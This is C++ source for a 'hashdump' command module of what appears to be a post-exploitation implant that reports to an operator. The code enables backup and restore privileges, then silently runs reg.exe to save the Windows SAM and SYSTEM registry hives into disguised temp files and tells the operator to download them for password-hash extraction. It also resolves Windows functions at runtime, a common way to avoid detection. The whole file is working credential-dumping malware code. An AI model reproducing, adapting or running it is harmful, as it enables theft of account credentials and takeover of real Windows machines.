#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_HASHDUMP

using namespace stardust;
using namespace starburst;

typedef DWORD (WINAPI *fn_GetTempPathA)( DWORD, LPSTR );
typedef BOOL  (WINAPI *fn_DeleteFileA)( LPCSTR );

// helper: enable a named privilege on the current process token
static auto declfn enable_privilege(
    instance& inst,
    const wchar_t* priv_name
) -> bool {
    HANDLE h_token = nullptr;
    if ( !inst.advapi32.OpenProcessToken(
            reinterpret_cast<HANDLE>( static_cast<LONG_PTR>( -1 ) ),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &h_token ) )
        return false;

    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    inst.advapi32.LookupPrivilegeValueW( nullptr, priv_name, &tp.Privileges[0].Luid );
    inst.advapi32.AdjustTokenPrivileges( h_token, FALSE, &tp, sizeof(tp), nullptr, nullptr );

    DWORD err = inst.kernel32.GetLastError();
    inst.kernel32.CloseHandle( h_token );
    return ( err == 0 );
}

// helper: execute a command via CreateProcessW, wait for completion, return exit code
static auto declfn exec_and_wait(
    instance& inst,
    char* cmdline_a,
    DWORD timeout_ms
) -> bool {
    wchar_t wcmdline[512] = { 0 };
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, cmdline_a, -1, wcmdline, 512 );

    STARTUPINFOW si = {};
    si.cb          = sizeof( STARTUPINFOW );
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {};

    BOOL ok = inst.kernel32.CreateProcessW(
        nullptr, wcmdline,
        nullptr, nullptr,
        FALSE,
        CREATE_NO_WINDOW,
        nullptr, nullptr,
        &si, &pi
    );

    if ( !ok )
        return false;

    inst.kernel32.WaitForSingleObject( pi.hProcess, timeout_ms );

    DWORD exit_code = 1;
    // GetExitCodeProcess is available via GetProcAddress
    typedef BOOL (WINAPI *fn_GetExitCodeProcess)( HANDLE, LPDWORD );
    auto pGetExitCodeProcess = reinterpret_cast<fn_GetExitCodeProcess>(
        inst.kernel32.GetProcAddress(
            (HMODULE)inst.kernel32.handle,
            symbol<LPCSTR>( "GetExitCodeProcess" ) ) );
    if ( pGetExitCodeProcess )
        pGetExitCodeProcess( pi.hProcess, &exit_code );

    inst.kernel32.CloseHandle( pi.hThread );
    inst.kernel32.CloseHandle( pi.hProcess );
    return ( exit_code == 0 );
}

auto declfn starburst::cmd_hashdump(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    (void)params;

    // resolve GetTempPathA from kernel32
    auto pGetTempPathA = reinterpret_cast<fn_GetTempPathA>(
        inst.kernel32.GetProcAddress(
            (HMODULE)inst.kernel32.handle,
            symbol<LPCSTR>( "GetTempPathA" ) ) );
    if ( !pGetTempPathA ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetTempPathA not found" ) ) );
        return;
    }

    // resolve DeleteFileA for cleanup
    auto pDeleteFileA = reinterpret_cast<fn_DeleteFileA>(
        inst.kernel32.GetProcAddress(
            (HMODULE)inst.kernel32.handle,
            symbol<LPCSTR>( "DeleteFileA" ) ) );

    // get temp directory
    char temp_dir[260] = { 0 };
    DWORD temp_len = pGetTempPathA( 260, temp_dir );
    if ( temp_len == 0 || temp_len > 240 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetTempPathA failed" ) ) );
        return;
    }

    // build temp file paths
    char sam_path[280] = { 0 };
    str_copy( sam_path, temp_dir );
    str_concat( sam_path, symbol<char*>( const_cast<char*>( "s.tmp" ) ) );

    char sys_path[280] = { 0 };
    str_copy( sys_path, temp_dir );
    str_concat( sys_path, symbol<char*>( const_cast<char*>( "y.tmp" ) ) );

    // enable SeBackupPrivilege for registry save access
    WCHAR backup_priv[] = { 'S','e','B','a','c','k','u','p','P','r','i','v','i','l','e','g','e', 0 };
    enable_privilege( inst, backup_priv );

    // also enable SeRestorePrivilege (helps with reg save)
    WCHAR restore_priv[] = { 'S','e','R','e','s','t','o','r','e','P','r','i','v','i','l','e','g','e', 0 };
    enable_privilege( inst, restore_priv );

    // build command: reg.exe save HKLM\SAM <path> /y
    char cmd_sam[512] = { 0 };
    str_copy( cmd_sam, symbol<char*>( const_cast<char*>( "reg.exe save HKLM\\SAM " ) ) );
    str_concat( cmd_sam, sam_path );
    str_concat( cmd_sam, symbol<char*>( const_cast<char*>( " /y" ) ) );

    // build command: reg.exe save HKLM\SYSTEM <path> /y
    char cmd_sys[512] = { 0 };
    str_copy( cmd_sys, symbol<char*>( const_cast<char*>( "reg.exe save HKLM\\SYSTEM " ) ) );
    str_concat( cmd_sys, sys_path );
    str_concat( cmd_sys, symbol<char*>( const_cast<char*>( " /y" ) ) );

    // execute SAM save
    bool sam_ok = exec_and_wait( inst, cmd_sam, 15000 );
    if ( !sam_ok ) {
        // cleanup on failure
        if ( pDeleteFileA ) pDeleteFileA( sam_path );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "reg save HKLM\\SAM failed" ) ) );
        return;
    }

    // execute SYSTEM save
    bool sys_ok = exec_and_wait( inst, cmd_sys, 15000 );
    if ( !sys_ok ) {
        // cleanup on failure
        if ( pDeleteFileA ) {
            pDeleteFileA( sam_path );
            pDeleteFileA( sys_path );
        }
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "reg save HKLM\\SYSTEM failed" ) ) );
        return;
    }

    // build output message with paths
    uint32_t out_cap = 1024;
    auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
    if ( !output ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    str_copy( output, symbol<char*>( const_cast<char*>(
        "SAM and SYSTEM hives saved. Use download to retrieve:\nSAM:    " ) ) );
    str_concat( output, sam_path );
    str_concat( output, symbol<char*>( const_cast<char*>( "\nSYSTEM: " ) ) );
    str_concat( output, sys_path );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
    inst.heap_free( output );
}

#endif
